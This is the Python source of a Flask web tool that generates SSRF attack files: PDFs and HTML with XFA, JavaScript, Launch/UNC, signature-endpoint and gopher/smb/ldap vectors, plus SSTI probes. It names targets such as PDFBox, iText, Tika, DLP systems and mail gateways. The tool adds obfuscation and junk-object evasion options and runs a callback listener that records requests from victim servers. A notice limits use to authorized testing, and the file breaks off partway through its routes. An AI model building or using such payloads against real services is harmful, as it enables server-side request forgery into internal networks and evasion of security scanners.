#!/usr/bin/env python3
"""
PDF & HTML SSRF Test File Generator — Web UI (v1.0, wraps generator v4.0)
=========================================================================
A Flask web interface for pdf_ssrf_gen5.py. Replaces the CLI with a
browser UI:

  - Manual payload generation (PDF vector / HTML / template fragments /
    batch) with one-click download
  - Persistent callback monitor, ENABLED BY DEFAULT, with a live hit
    table (auto-refresh), clear / export, start / stop / restart
  - Generated-file history with download / delete
  - All evasion options from the CLI: compress, obfuscate, junk objects,
    hex-url, URL mutation, reproducible seed, dry-run validation

LEGAL NOTICE: Authorized security testing ONLY. Use strictly within
written penetration-testing scope or your own defensive research lab.

Requirements:
  - pdf_ssrf_gen5.py must be importable. Place this file in the SAME
    directory as pdf_ssrf_gen5.py, or set env var PDF_SSRF_GEN5_PATH
    to the directory containing it (~/Downloads is also auto-detected).
  - Flask:  pip install flask

Usage:
  python pdf_ssrf_web.py                          # web on 127.0.0.1:5000, monitor on 0.0.0.0:8888
  python pdf_ssrf_web.py --port 8080 --listen-port 9999
  python pdf_ssrf_web.py --no-monitor             # disable the callback monitor
"""

import argparse
import hashlib
import json
import os
import socket
import sys
import threading
import zipfile
from datetime import datetime
from http.server import ThreadingHTTPServer, BaseHTTPRequestHandler

WEB_VERSION = "1.0.0"
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
OUTPUT_DIR = os.path.join(SCRIPT_DIR, "ssrf_web_output")


# ============================================================
#              Locate and import the generator module
# ============================================================

def load_generator():
    candidates = [
        SCRIPT_DIR,
        os.environ.get("PDF_SSRF_GEN5_PATH", ""),
        os.path.join(os.path.expanduser("~"), "Downloads"),
        os.getcwd(),
    ]
    for cand in candidates:
        if cand and os.path.isfile(os.path.join(cand, "pdf_ssrf_gen5.py")):
            if cand not in sys.path:
                sys.path.insert(0, cand)
            break
    try:
        import pdf_ssrf_gen5 as gen
        return gen
    except ImportError:
        print("[FATAL] Cannot import pdf_ssrf_gen5.py")
        print("        Put pdf_ssrf_web.py next to pdf_ssrf_gen5.py, or set")
        print("        PDF_SSRF_GEN5_PATH to the directory containing it.")
        sys.exit(1)


gen = load_generator()

# Serializes generation (gen uses a module-level RNG for seed/obfuscation)
GEN_LOCK = threading.Lock()

TYPE_INFO = [
    ("xfa",        "XFA 连接源 SSRF —— 打 PDFBox / iText / Apache Tika"),
    ("js",         "JavaScript 自动执行（launchURL / submitForm / Net.HTTP），需 JS 引擎"),
    ("filespec",   "外部图片 XObject /F + FileSpec 外联"),
    ("submit",     "SubmitForm 表单数据外带"),
    ("launch",     "Launch 动作（老旧阅读器 / Windows UNC 解析）"),
    ("uri",        "纯 /URI 动作 —— 解析器支持面最广"),
    ("importdata", "ImportData 动作（FDF/XFDF 导入，打 iText / PDFBox）"),
    ("gotor",      "GoToR 远程文档跳转抓取"),
    ("gotoe",      "GoToE 嵌入文档跳转"),
    ("rendition",  "Rendition 多媒体外链"),
    ("aa",         "Additional Actions 多生命周期触发（/O /C /WC /WS /PV）"),
    ("embedded",   "嵌套 PDF 附件 —— 打 DLP / 邮件网关的附件重解析链"),
    ("multi",      "协议矩阵：http/https/file/ftp/gopher/dict/smb/UNC/ldap/jar/netdoc"),
    ("sig",        "签名验证 SSRF（/Sig CRL/OCSP/TS 端点，打电子签平台、DLP、文档验证服务）"),
    ("af",         "PDF 2.0 关联文件（Catalog /AF + /FS /URL）"),
    ("richmedia",  "RichMedia 注解外部资源预取（Flash/3D 阅读器、缩略图服务）"),
    ("all",        "组合载荷（XFA + JS + FileSpec + Submit + URI 链）"),
]


# ============================================================
#                   Persistent Callback Monitor
# ============================================================

class CallbackMonitor:
    """Always-on callback listener (unlike the CLI one-shot listener)."""

    def __init__(self):
        self.hits = []
        self.lock = threading.Lock()
        self.server = None
        self.thread = None
        self.port = None
        self.bind = None
        self.started_at = None
        self.last_error = None

    @property
    def running(self):
        return self.server is not None

    def start(self, port, bind="0.0.0.0"):
        with self.lock:
            if self.server is not None:
                raise RuntimeError("monitor already running")
            handler = self._make_handler()
            srv = ThreadingHTTPServer((bind, int(port)), handler)
            srv.daemon_threads = True
            t = threading.Thread(target=srv.serve_forever,
                                 kwargs={"poll_interval": 0.5},
                                 daemon=True, name="callback-monitor")
            t.start()
            self.server = srv
            self.thread = t
            self.port = int(port)
            self.bind = bind
            self.started_at = datetime.now().isoformat()
            self.last_error = None

    def stop(self):
        with self.lock:
            srv = self.server
            self.server = None
            self.thread = None
            self.started_at = None
        if srv is not None:
            srv.shutdown()
            srv.server_close()

    def restart(self, port, bind):
        self.stop()
        self.start(port, bind)

    def record(self, entry):
        with self.lock:
            self.hits.append(entry)

    def snapshot(self):
        with self.lock:
            return list(self.hits)

    def clear(self):
        with self.lock:
            self.hits = []

    def status(self):
        uptime = None
        if self.running and self.started_at:
            delta = datetime.now() - datetime.fromisoformat(self.started_at)
            uptime = int(delta.total_seconds())
        with self.lock:
            count = len(self.hits)
        return {
            "running": self.running,
            "port": self.port,
            "bind": self.bind,
            "started_at": self.started_at,
            "uptime": uptime,
            "count": count,
            "last_error": self.last_error,
        }

    def _make_handler(self):
        monitor = self

        class CallbackHTTPHandler(BaseHTTPRequestHandler):
            def _record_and_respond(self):
                monitor.record({
                    "time": datetime.now().isoformat(timespec="seconds"),
                    "method": self.command,
                    "path": self.path,
                    "client": self.client_address[0],
                    "headers": {k: v for k, v in self.headers.items()},
                })
                body = b"ok"
                self.send_response(200)
                self.send_header("Content-Type", "text/plain")
                self.send_header("Content-Length", str(len(body)))
                self.end_headers()
                if self.command != "HEAD":
                    try:
                        self.wfile.write(body)
                    except (BrokenPipeError, ConnectionResetError):
                        pass

            do_GET = _record_and_respond
            do_POST = _record_and_respond
            do_PUT = _record_and_respond
            do_HEAD = _record_and_respond
            do_OPTIONS = _record_and_respond
            do_DELETE = _record_and_respond

            def log_message(self, fmt, *args):
                pass  # silence; the web UI displays hits

        return CallbackHTTPHandler


MON = CallbackMonitor()


# ============================================================
#                         Helpers
# ============================================================

def safe_join_output(rel):
    """Resolve rel inside OUTPUT_DIR; return None on traversal."""
    base = os.path.realpath(OUTPUT_DIR)
    target = os.path.realpath(os.path.join(base, rel))
    if target != base and target.startswith(base + os.sep):
        return target
    return None


def local_ips():
    ips = set()
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ips.add(s.getsockname()[0])
        s.close()
    except OSError:
        pass
    try:
        for info in socket.getaddrinfo(socket.gethostname(), None):
            ip = info[4][0]
            if ":" not in ip and not ip.startswith("127."):
                ips.add(ip)
    except OSError:
        pass
    return sorted(ips)


def file_meta(path, rel=None):
    with open(path, "rb") as f:
        digest = hashlib.sha256(f.read()).hexdigest()
    st = os.stat(path)
    return {
        "name": rel if rel else os.path.basename(path),
        "size": st.st_size,
        "sha256": digest,
        "mtime": datetime.fromtimestamp(st.st_mtime).isoformat(timespec="seconds"),
    }


def list_output_files():
    out = []
    if not os.path.isdir(OUTPUT_DIR):
        return out
    for root, _dirs, files in os.walk(OUTPUT_DIR):
        for fn in files:
            full = os.path.join(root, fn)
            rel = os.path.relpath(full, OUTPUT_DIR).replace(os.sep, "/")
            try:
                out.append(file_meta(full, rel))
            except OSError:
                continue
    out.sort(key=lambda x: x["mtime"], reverse=True)
    return out


# ============================================================
#                        Web Frontend (HTML)
# ============================================================

INDEX_HTML = r"""<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>PDF/HTML SSRF 测试平台</title>
<style>
  :root{
    --bg:#f5f6f8; --card:#ffffff; --border:#e3e6ea; --text:#1f2329;
    --muted:#6b7280; --accent:#c0392b; --accent-soft:#fdf0ee;
    --green:#1e9e6a; --green-soft:#e8f7f0; --blue:#2563eb; --mono:Consolas,"Courier New",monospace;
  }
  *{box-sizing:border-box;margin:0;padding:0}
  body{background:var(--bg);color:var(--text);font:14px/1.6 "Microsoft YaHei","PingFang SC",system-ui,sans-serif}
  header{display:flex;align-items:center;gap:14px;flex-wrap:wrap;background:#1c2333;color:#fff;padding:12px 22px}
  header .brand{font-size:17px;font-weight:600}
  header .ver{font-size:11px;color:#9aa4b8;margin-left:6px;font-weight:400}
  header .legal{font-size:11px;background:#7a2c22;border-radius:4px;padding:2px 8px}
  header .spacer{flex:1}
  .pill{font-size:12px;border-radius:20px;padding:4px 12px;display:inline-flex;align-items:center;gap:7px;background:#2a3348}
  .pill .dot{width:8px;height:8px;border-radius:50%;background:#888}
  .pill.on .dot{background:#2fd48a;box-shadow:0 0 6px #2fd48a}
  .pill b{font-weight:600}
  main{max-width:1240px;margin:20px auto;padding:0 16px;display:grid;grid-template-columns:460px 1fr;gap:16px;align-items:start}
  @media (max-width:980px){main{grid-template-columns:1fr}}
  .card{background:var(--card);border:1px solid var(--border);border-radius:12px;padding:18px;margin-bottom:16px}
  .card h2{font-size:15px;font-weight:600;margin-bottom:12px;display:flex;align-items:center;gap:8px}
  .badge{background:var(--accent);color:#fff;font-size:11px;border-radius:10px;padding:1px 8px;font-weight:600}
  .tabs{display:flex;gap:6px;margin-bottom:14px;flex-wrap:wrap}
  .tabs button{flex:1;min-width:90px;border:1px solid var(--border);background:#f8f9fb;border-radius:8px;padding:7px 4px;cursor:pointer;font-size:13px;color:var(--muted)}
  .tabs button.active{background:var(--accent-soft);border-color:var(--accent);color:var(--accent);font-weight:600}
  label{display:block;font-size:12px;color:var(--muted);margin:10px 0 4px}
  input[type=text],input[type=number],select{width:100%;border:1px solid var(--border);border-radius:8px;padding:8px 10px;font-size:13px;background:#fff;color:var(--text)}
  input:focus,select:focus{outline:none;border-color:var(--accent)}
  .quick{margin-top:6px;display:flex;gap:6px;flex-wrap:wrap}
  .quick span{font-size:11px;background:#eef2ff;color:var(--blue);border-radius:5px;padding:2px 8px;cursor:pointer;font-family:var(--mono)}
  .quick span:hover{background:#dbe4ff}
  .desc{font-size:12px;color:var(--muted);background:#f8f9fb;border-left:3px solid var(--accent);border-radius:0 6px 6px 0;padding:6px 10px;margin-top:6px;min-height:32px}
  .opts{display:grid;grid-template-columns:1fr 1fr;gap:4px 12px;margin-top:6px}
  .opts label{display:flex;align-items:center;gap:6px;font-size:13px;color:var(--text);margin:3px 0;cursor:pointer}
  .row{display:flex;gap:10px}
  .row>div{flex:1}
  .chips{display:flex;flex-wrap:wrap;gap:6px;margin-top:6px;max-height:170px;overflow:auto;padding:2px}
  .chip{font-size:12px;border:1px solid var(--border);border-radius:14px;padding:3px 11px;cursor:pointer;background:#fff;user-select:none}
  .chip.sel{background:var(--accent-soft);border-color:var(--accent);color:var(--accent);font-weight:600}
  .chip-tools{margin-top:4px;font-size:12px}
  .chip-tools a{color:var(--blue);cursor:pointer;margin-right:10px;text-decoration:none}
  .btn{display:inline-block;border:none;border-radius:8px;padding:9px 18px;font-size:14px;cursor:pointer;background:var(--accent);color:#fff;font-weight:600;width:100%;margin-top:14px}
  .btn:hover{filter:brightness(1.08)}
  .btn:disabled{opacity:.55;cursor:wait}
  .btn.sm{width:auto;padding:4px 12px;font-size:12px;font-weight:400;margin-top:0}
  .btn.gray{background:#5b6472}.btn.green{background:var(--green)}
  .result{margin-top:14px;border:1px solid var(--green);background:var(--green-soft);border-radius:10px;padding:12px;font-size:13px;display:none}
  .result.err{border-color:var(--accent);background:var(--accent-soft)}
  .result .kv{font-family:var(--mono);font-size:12px;word-break:break-all}
  .result a.dl{display:inline-block;margin-top:8px;background:var(--green);color:#fff;border-radius:7px;padding:6px 16px;text-decoration:none;font-weight:600}
  .result ul{margin:6px 0 0 18px;font-size:12px;font-family:var(--mono)}
  .hint{font-size:12px;color:var(--muted);background:#f8f9fb;border-radius:8px;padding:8px 10px;margin-top:12px}
  .monctl{display:flex;gap:8px;align-items:flex-end;flex-wrap:wrap;margin-bottom:10px}
  .monctl .fld{width:110px}
  .monctl label{margin:0 0 2px}
  .monstat{font-size:12px;color:var(--muted);margin-bottom:8px}
  table{width:100%;border-collapse:collapse;font-size:12px}
  th{text-align:left;color:var(--muted);font-weight:500;border-bottom:1px solid var(--border);padding:5px 6px;white-space:nowrap}
  td{border-bottom:1px solid #f0f1f3;padding:5px 6px;font-family:var(--mono);word-break:break-all;vertical-align:top}
  tr.fresh td{background:#fff8e6}
  .hits-wrap{max-height:330px;overflow:auto;border:1px solid var(--border);border-radius:8px}
  .empty{color:var(--muted);font-size:12px;text-align:center;padding:18px 0}
  .flist{max-height:260px;overflow:auto}
  .fitem{display:flex;align-items:center;gap:8px;padding:6px 4px;border-bottom:1px solid #f0f1f3;font-size:12px}
  .fitem .fn{font-family:var(--mono);word-break:break-all;flex:1}
  .fitem .fs{color:var(--muted);white-space:nowrap}
  .fitem a{color:var(--blue);text-decoration:none;white-space:nowrap}
  .fitem a.del{color:var(--accent);cursor:pointer}
  .toolbar{display:flex;gap:8px;margin-bottom:8px;flex-wrap:wrap}
</style>
</head>
<body>
<header>
  <div class="brand">PDF / HTML SSRF 测试平台<span class="ver" id="ver"></span></div>
  <div class="legal">仅限授权安全测试</div>
  <div class="spacer"></div>
  <div class="pill" id="monPill"><span class="dot"></span><span id="monPillTxt">监控检测中…</span></div>
</header>
<main>
  <!-- ============ left: generator ============ -->
  <section class="card">
    <h2>载荷生成</h2>
    <div class="tabs">
      <button data-mode="pdf" class="active">PDF 向量</button>
      <button data-mode="html">HTML 载荷</button>
      <button data-mode="template">模板片段</button>
      <button data-mode="batch">批量生成</button>
    </div>

    <label>回调 URL（目标服务器将请求这里）</label>
    <input type="text" id="url" placeholder="http://你的IP:8888/">
    <div class="quick" id="quickIps"></div>

    <div class="pane" id="pane-pdf">
      <label>向量类型</label>
      <select id="ptype"></select>
      <div class="desc" id="ptypeDesc"></div>
    </div>

    <div class="pane" id="pane-html" style="display:none">
      <div class="opts"><label><input type="checkbox" id="htmlMutate"> URL 变异（IP 进制/IPv6/localhost 混淆）</label></div>
      <div class="desc">生成含 31 种危险子资源（img/script/iframe/SVG/CSS/JS fetch…）的 HTML 文件，用于 HTML 转 PDF 引擎测试。</div>
    </div>

    <div class="pane" id="pane-template" style="display:none">
      <div class="opts"><label><input type="checkbox" id="tplMutate"> URL 变异</label></div>
      <div class="desc">生成可粘贴到业务字段（备注 / logo URL / 背景）的注入片段，含 Jinja/Twig、FreeMarker 等 SSTI 探针。</div>
    </div>

    <div class="pane" id="pane-batch" style="display:none">
      <label>选择向量（不选 = 全部 17 种）</label>
      <div class="chips" id="typeChips"></div>
      <div class="chip-tools"><a id="chipAll">全选</a><a id="chipNone">清空</a></div>
      <div class="opts">
        <label><input type="checkbox" id="batchHtml"> 同时生成 HTML 载荷</label>
        <label><input type="checkbox" id="batchMutate"> HTML URL 变异</label>
      </div>
    </div>

    <div id="pdfOpts">
      <label>PDF 结构 / 免杀选项</label>
      <div class="opts">
        <label><input type="checkbox" id="optCompress"> FlateDecode 压缩</label>
        <label><input type="checkbox" id="optObfuscate"> ASCIIHex 混淆</label>
        <label><input type="checkbox" id="optHexUrl"> URL 十六进制编码</label>
        <label><input type="checkbox" id="optDryRun"> Dry-run（仅校验不输出）</label>
      </div>
      <div class="row">
        <div><label>垃圾诱饵对象数</label><input type="number" id="optJunk" value="0" min="0" max="500"></div>
        <div><label>随机种子（可复现，留空随机）</label><input type="number" id="optSeed" placeholder="例如 1337"></div>
      </div>
    </div>

    <button class="btn" id="genBtn">生成载荷</button>
    <div class="result" id="genResult"></div>
    <div class="hint">流程：① 填回调 URL → ② 生成并下载 → ③ 提交到目标服务（预览/转换/验签接口）→ ④ 在右侧「回调监控」观察命中，按请求路径（如 /sig_crl、/ssrf_gopher）判断触发的向量与协议。</div>
  </section>

  <!-- ============ right: monitor + files ============ -->
  <div>
    <section class="card">
      <h2>回调监控 <span class="badge" id="hitCount">0</span></h2>
      <div class="monctl">
        <div class="fld"><label>监听地址</label><input type="text" id="monBind" value="0.0.0.0"></div>
        <div class="fld"><label>端口</label><input type="number" id="monPort" value="8888"></div>
        <button class="btn sm green" id="monStart">启动</button>
        <button class="btn sm gray" id="monStop">停止</button>
        <button class="btn sm" id="monRestart">应用并重启</button>
        <div class="spacer" style="flex:1"></div>
        <button class="btn sm gray" id="hitsClear">清空命中</button>
        <button class="btn sm gray" id="hitsExport">导出 JSON</button>
      </div>
      <div class="monstat" id="monStat"></div>
      <div class="hits-wrap">
        <table>
          <thead><tr><th>时间</th><th>方法</th><th>路径</th><th>来源 IP</th><th>User-Agent</th></tr></thead>
          <tbody id="hitsBody"></tbody>
        </table>
        <div class="empty" id="hitsEmpty">暂无命中 —— 提交载荷后这里会实时显示</div>
      </div>
    </section>

    <section class="card">
      <h2>生成文件</h2>
      <div class="toolbar"><button class="btn sm gray" id="filesRefresh">刷新列表</button></div>
      <div class="flist" id="fileList"></div>
    </section>
  </div>
</main>

<script>
let MODE = "pdf";
let TYPES = [];
let lastHitCount = 0;

const $ = id => document.getElementById(id);

function fmtSize(n){
  if(n < 1024) return n + " B";
  if(n < 1048576) return (n/1024).toFixed(1) + " KB";
  return (n/1048576).toFixed(2) + " MB";
}
function esc(s){return String(s).replace(/[&<>"]/g, c=>({"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;"}[c]));}

// ---------- tabs ----------
document.querySelectorAll(".tabs button").forEach(b=>{
  b.onclick = ()=>{
    document.querySelectorAll(".tabs button").forEach(x=>x.classList.remove("active"));
    b.classList.add("active");
    MODE = b.dataset.mode;
    ["pdf","html","template","batch"].forEach(m=>{
      $("pane-"+m).style.display = (m===MODE)?"block":"none";
    });
    $("pdfOpts").style.display = (MODE==="pdf"||MODE==="batch")?"block":"none";
    $("optDryRun").closest("label").style.display = (MODE==="pdf")?"flex":"none";
  };
});

// ---------- init config ----------
async function init(){
  const cfg = await (await fetch("/api/config")).json();
  $("ver").textContent = "web v" + cfg.web_version + " · 生成器 v" + cfg.version;
  TYPES = cfg.types;
  const sel = $("ptype");
  TYPES.forEach(t=>{
    const o = document.createElement("option");
    o.value = t.id; o.textContent = t.id;
    sel.appendChild(o);
  });
  sel.value = "multi";
  updateDesc();
  sel.onchange = updateDesc;
  // chips
  const chips = $("typeChips");
  TYPES.forEach(t=>{
    const c = document.createElement("span");
    c.className = "chip"; c.textContent = t.id; c.dataset.id = t.id;
    c.title = t.desc;
    c.onclick = ()=>c.classList.toggle("sel");
    chips.appendChild(c);
  });
  $("chipAll").onclick = ()=>document.querySelectorAll(".chip").forEach(c=>c.classList.add("sel"));
  $("chipNone").onclick = ()=>document.querySelectorAll(".chip").forEach(c=>c.classList.remove("sel"));
  // quick IPs
  const qi = $("quickIps");
  cfg.local_ips.forEach(ip=>{
    const s = document.createElement("span");
    s.textContent = "http://" + ip + ":" + (cfg.monitor.port||8888) + "/";
    s.onclick = ()=>{ $("url").value = s.textContent; };
    qi.appendChild(s);
  });
  if(cfg.default_url) $("url").placeholder = cfg.default_url;
  if(cfg.monitor.port) $("monPort").value = cfg.monitor.port;
  if(cfg.monitor.bind) $("monBind").value = cfg.monitor.bind;
  refreshHits();
  refreshFiles();
  setInterval(refreshHits, 2000);
}
function updateDesc(){
  const t = TYPES.find(x=>x.id===$("ptype").value);
  $("ptypeDesc").textContent = t ? t.desc : "";
}

// ---------- generate ----------
$("genBtn").onclick = async ()=>{
  const url = $("url").value.trim();
  if(!url){ showResult("请先填写回调 URL", true); return; }
  const btn = $("genBtn");
  btn.disabled = true; btn.textContent = "生成中…";
  try{
    if(MODE === "batch"){ await doBatch(url); }
    else{ await doSingle(url); }
  }catch(e){
    showResult("请求失败: " + e.message, true);
  }finally{
    btn.disabled = false; btn.textContent = "生成载荷";
  }
};

function commonOpts(){
  return {
    compress: $("optCompress").checked,
    obfuscate: $("optObfuscate").checked,
    hex_url: $("optHexUrl").checked,
    junk: parseInt($("optJunk").value||"0",10),
    seed: $("optSeed").value===""?null:parseInt($("optSeed").value,10),
  };
}

async function doSingle(url){
  const body = {
    mode: MODE, url: url,
    type: $("ptype").value,
    dry_run: $("optDryRun").checked,
    mutate: MODE==="html" ? $("htmlMutate").checked : $("tplMutate").checked,
    ...commonOpts(),
  };
  const r = await (await fetch("/api/generate",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(body)})).json();
  if(!r.ok){ showResult("生成失败: " + r.error, true); return; }
  if(r.dry_run){
    showResult("<b>Dry-run 通过</b><div class='kv'>对象数: " + r.objects + " · 校验问题: " + r.errors.length + "</div>", false);
    return;
  }
  showResult(
    "<b>生成成功</b> · 类型 " + esc(r.type) +
    "<div class='kv'>" + esc(r.name) + " · " + fmtSize(r.size) + "<br>sha256: " + r.sha256.slice(0,32) + "…</div>" +
    "<a class='dl' href='/download/" + encodeURIComponent(r.name) + "'>下载文件</a>", false);
  refreshFiles();
}

async function doBatch(url){
  const types = [...document.querySelectorAll(".chip.sel")].map(c=>c.dataset.id);
  const body = {
    url: url, types: types,
    include_html: $("batchHtml").checked,
    mutate: $("batchMutate").checked,
    ...commonOpts(),
  };
  const r = await (await fetch("/api/batch",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(body)})).json();
  if(!r.ok){ showResult("批量生成失败: " + r.error, true); return; }
  let lis = r.files.map(f=>{
    if(f.status==="ok"){
      const rel = f.rel || f.name;
      return "<li>" + esc(f.type) + " — <a href='/download/" + encodeURIComponent(rel) + "'>" + esc(rel) + "</a> (" + fmtSize(f.size) + ")</li>";
    }
    return "<li style='color:#c0392b'>" + esc(f.type) + " — 失败: " + esc(f.error||"") + "</li>";
  }).join("");
  showResult(
    "<b>批量完成</b> · 成功 " + r.ok + "/" + r.files.length +
    "<ul>" + lis + "</ul>" +
    "<a class='dl' href='/download/" + encodeURIComponent(r.zip) + "'>下载 ZIP 打包</a> " +
    "<a class='dl' style='background:#5b6472' href='/download/" + encodeURIComponent(r.report) + "'>下载报告 JSON</a>", false);
  refreshFiles();
}

function showResult(html, isErr){
  const d = $("genResult");
  d.className = "result" + (isErr?" err":"");
  d.innerHTML = html;
  d.style.display = "block";
}

// ---------- monitor ----------
async function refreshHits(){
  let r;
  try{ r = await (await fetch("/api/hits")).json(); }
  catch(e){ return; }
  const pill = $("monPill");
  if(r.running){
    pill.classList.add("on");
    $("monPillTxt").innerHTML = "监控运行中 <b>" + esc(r.bind) + ":" + r.port + "</b>";
  }else{
    pill.classList.remove("on");
    $("monPillTxt").textContent = "监控已停止";
  }
  let stat = r.running
    ? "已运行 " + (r.uptime==null?"?":r.uptime) + " 秒 · 累计命中 " + r.count
    : (r.last_error ? "上次错误: " + r.last_error : "未运行");
  $("monStat").textContent = stat;
  $("hitCount").textContent = r.count;
  const body = $("hitsBody");
  const hits = r.hits.slice().reverse();
  $("hitsEmpty").style.display = hits.length ? "none" : "block";
  body.innerHTML = hits.map((h,i)=>{
    const ua = (h.headers && (h.headers["User-Agent"]||h.headers["user-agent"])) || "";
    const fresh = (r.count > lastHitCount && i < (r.count - lastHitCount)) ? " class='fresh'" : "";
    return "<tr"+fresh+"><td>" + esc(h.time.slice(11)) + "</td><td>" + esc(h.method) +
           "</td><td>" + esc(h.path) + "</td><td>" + esc(h.client||"") + "</td><td>" + esc(ua) + "</td></tr>";
  }).join("");
  lastHitCount = r.count;
}

async function monAction(action){
  const body = {action: action, port: parseInt($("monPort").value||"8888",10), bind: $("monBind").value.trim()||"0.0.0.0"};
  const r = await (await fetch("/api/monitor",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(body)})).json();
  if(!r.ok) alert("操作失败: " + r.error);
  refreshHits();
}
$("monStart").onclick = ()=>monAction("start");
$("monStop").onclick = ()=>monAction("stop");
$("monRestart").onclick = ()=>monAction("restart");
$("hitsClear").onclick = async ()=>{ await fetch("/api/hits/clear",{method:"POST"}); lastHitCount=0; refreshHits(); };
$("hitsExport").onclick = ()=>{ window.location = "/api/hits/export"; };

// ---------- files ----------
async function refreshFiles(){
  const r = await (await fetch("/api/files")).json();
  const list = $("fileList");
  if(!r.files.length){ list.innerHTML = "<div class='empty'>暂无生成文件</div>"; return; }
  list.innerHTML = r.files.map(f=>
    "<div class='fitem'><span class='fn'>" + esc(f.name) + "</span>" +
    "<span class='fs'>" + fmtSize(f.size) + " · " + esc(f.mtime.slice(5,16)) + "</span>" +
    "<a href='/download/" + encodeURIComponent(f.name) + "'>下载</a>" +
    "<a class='del' data-n='" + esc(f.name) + "'>删除</a></div>"
  ).join("");
  list.querySelectorAll(".del").forEach(a=>{
    a.onclick = async ()=>{
      if(!confirm("删除 " + a.dataset.n + " ?")) return;
      await fetch("/api/files/delete",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({name:a.dataset.n})});
      refreshFiles();
    };
  });
}
$("filesRefresh").onclick = refreshFiles;

init();
</script>
</body>
</html>
"""


# ============================================================
#                        Flask Application
# ============================================================

def create_app():
    try:
        from flask import Flask, request, jsonify, send_from_directory, Response
    except ImportError:
        print("[FATAL] Flask is required. Install it with:  pip install flask")
        sys.exit(1)

    app = Flask(__name__)
    os.makedirs(OUTPUT_DIR, exist_ok=True)

    # ---------- pages ----------

    @app.get("/")
    def index():
        return Response(INDEX_HTML, mimetype="text/html")

    @app.get("/download/<path:name>")
    def download(name):
        target = safe_join_output(name)
        if not target or not os.path.isfile(target):
            return jsonify({"ok": False, "error": "file not found"}), 404
        rel = os.path.relpath(target, OUTPUT_DIR).replace(os.sep, "/")
        return send_from_directory(OUTPUT_DIR, rel, as_attachment=True)

    # ---------- config ----------

    @app.get("/api/config")
    def api_config():
        ips = local_ips()
        port = MON.port or 8888
        default_url = ("http://%s:%d/" % (ips[0], port)) if ips else ""
        return jsonify({
            "version": getattr(gen, "__version__", "unknown"),
            "web_version": WEB_VERSION,
            "types": [{"id": t, "desc": d} for t, d in TYPE_INFO],
            "local_ips": ips,
            "monitor": MON.status(),
            "default_url": default_url,
        })

    # ---------- generation ----------

    @app.post("/api/generate")
    def api_generate():
        data = request.get_json(force=True, silent=True) or {}
        mode = data.get("mode", "pdf")
        url = (data.get("url") or "").strip()
        if not url:
            return jsonify({"ok": False, "error": "回调 URL 不能为空"}), 400

        seed = data.get("seed")
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")

        try:
            with GEN_LOCK:
                if seed is not None:
                    gen.set_seed(int(seed))

                if mode in ("html", "template"):
                    template_mode = (mode == "template")
                    fname = ("ssrf_fragments_%s.txt" % ts) if template_mode \
                        else ("ssrf_html_%s.html" % ts)
                    path = os.path.join(OUTPUT_DIR, fname)
                    meta = gen.generate_html_payload(
                        url, path,
                        mutate=bool(data.get("mutate")),
                        template_mode=template_mode)
                    m = file_meta(path)
                    return jsonify({"ok": True, "type": meta["type"], **m})

                # ---- PDF single ----
                ptype = data.get("type")
                if ptype not in gen.BUILD_FUNCTIONS:
                    return jsonify({"ok": False,
                                    "error": "未知向量类型: %s" % ptype}), 400
                gen.validate_url(url, ptype)
                builder = gen.PDFBuilder(
                    compress=bool(data.get("compress")),
                    obfuscate=bool(data.get("obfuscate")),
                    junk_count=max(0, int(data.get("junk") or 0)),
                    hex_url=bool(data.get("hex_url")))
                gen.BUILD_FUNCTIONS[ptype](url, builder)

                if data.get("dry_run"):
                    errors = builder.validate()
                    return jsonify({"ok": True, "dry_run": True,
                                    "objects": len(builder.objects),
                                    "errors": errors})

                fname = "ssrf_%s_%s.pdf" % (ptype, ts)
                path = os.path.join(OUTPUT_DIR, fname)
                builder.generate(path)
                m = file_meta(path)
                return jsonify({"ok": True, "type": ptype, **m})

        except ValueError as e:
            return jsonify({"ok": False, "error": str(e)}), 400
        except Exception as e:  # builder errors etc.
            return jsonify({"ok": False, "error": "%s: %s"
                            % (type(e).__name__, e)}), 500

    @app.post("/api/batch")
    def api_batch():
        data = request.get_json(force=True, silent=True) or {}
        url = (data.get("url") or "").strip()
        if not url:
            return jsonify({"ok": False, "error": "回调 URL 不能为空"}), 400

        types = data.get("types") or None
        if types:
            unknown = [t for t in types if t not in gen.BUILD_FUNCTIONS]
            if unknown:
                return jsonify({"ok": False,
                                "error": "未知向量: %s" % ", ".join(unknown)}), 400

        seed = data.get("seed")
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        batch_dir = os.path.join(OUTPUT_DIR, "batch_%s" % ts)
        try:
            with GEN_LOCK:
                if seed is not None:
                    gen.set_seed(int(seed))
                report = gen.batch_generate(
                    url, batch_dir,
                    compress=bool(data.get("compress")),
                    obfuscate=bool(data.get("obfuscate")),
                    junk_count=max(0, int(data.get("junk") or 0)),
                    hex_url=bool(data.get("hex_url")),
                    types=types,
                    mutate=bool(data.get("mutate")),
                    include_html=bool(data.get("include_html")))
        except Exception as e:
            return jsonify({"ok": False, "error": "%s: %s"
                            % (type(e).__name__, e)}), 500

        # enrich files with relative download paths
        files = []
        for f in report["files"]:
            if f.get("status") == "ok" and f.get("path"):
                rel = os.path.relpath(f["path"], OUTPUT_DIR).replace(os.sep, "/")
                files.append({"type": f["type"], "status": "ok",
                              "rel": rel, "size": f.get("size", 0),
                              "sha256": f.get("sha256", "")})
            else:
                files.append({"type": f.get("type"), "status": "error",
                              "error": f.get("error", "")})

        # zip the batch directory
        zip_name = "batch_%s.zip" % ts
        zip_path = os.path.join(OUTPUT_DIR, zip_name)
        with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as zf:
            for root, _d, fns in os.walk(batch_dir):
                for fn in fns:
                    full = os.path.join(root, fn)
                    zf.write(full, os.path.relpath(full, batch_dir))

        ok_count = sum(1 for f in files if f["status"] == "ok")
        return jsonify({
            "ok": True, "ok_count": ok_count,
            "files": files, "zip": zip_name,
            "report": os.path.relpath(os.path.join(batch_dir,
                                                   "batch_report.json"),
                                      OUTPUT_DIR).replace(os.sep, "/"),
        })

    # ---------- files ----------

    @app.get("/api/files")
